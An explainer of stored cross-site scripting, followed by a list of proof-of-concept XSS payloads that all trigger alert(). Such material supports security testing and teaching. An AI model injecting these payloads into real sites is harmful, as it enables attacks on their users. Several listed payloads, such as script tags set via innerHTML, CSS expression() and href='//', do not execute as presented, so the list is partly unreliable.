## What is stored XSS?
Stored Cross-Site Scripting (Stored XSS) involves a three-step process. First, the attacker submits a malicious script through an input that stores data on the server, such as a form field or user profile. This script could be saved to a database, log file, or other data storage. Second, unlike reflected XSS, where the malicious script is immediately sent back to the user, stored XSS results in the script becoming a permanent part of the data on the server. Finally, the execution phase occurs when any user accesses the page or section where the malicious script resides. Since the script appears to be part of the legitimate content of the website, the user's browser executes it without recognizing its malicious nature, leading to potential security breaches such as data theft or account hijacking.
## Examples of attacks
##### ***Stored XSS in href attribute***
If there is input being stored in an href attribute you can use a simple payload like `javascript:alert(1)` to test if it is working.

```
<a id="author" href="javascript:alert(8007)">random input</a>
```

***XSS payloads***
```
document.write('<script>alert("Hello!");</script>');
document.body.innerHTML = '<script>alert("Hello!");</script>';
var script = document.createElement('script');
script.textContent = 'alert("Hello!");';
document.body.appendChild(script);
$('body').html('<script>alert("Hello!");</script>');
$('body').append('<script>alert("Hello!");</script>');
<button onclick="eval('alert(\'Hello!\')')">Click me</button>
<a href="javascript:alert('Hello!')">Click me</a>
var script = document.createElement('script');
script.setAttribute('type', 'text/javascript');
script.text = 'alert("Hello!");';
document.body.appendChild(script);
var script = document.createElement('script');
script.type = 'text/javascript';
script.textContent = 'alert("Hello!");';
document.head.appendChild(script);
<img src="nonexistent.jpg" onerror="alert('Hello!')">
<div style="background:url('javascript:alert(\'Hello!\')')">Test</div>
document.body.insertAdjacentHTML('beforeend', '<script>alert("Hello!");</script>');
var script = document.createElement('script');
script.text = 'alert("Hello!");';
document.body.insertBefore(script, document.body.firstChild);
<link rel="stylesheet" href="javascript:alert('Hello!')">
<iframe src="javascript:alert('Hello!')"></iframe>
<object data="javascript:alert('Hello!')"></object>
<style>*{x:expression(alert('Hello!'))}</style>
<meta http-equiv="refresh" content="0;url=javascript:alert('Hello!')">
<base href="javascript:alert('Hello!')">
<a href="//">Click me</a>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('Hello!')</script>
</svg>
```
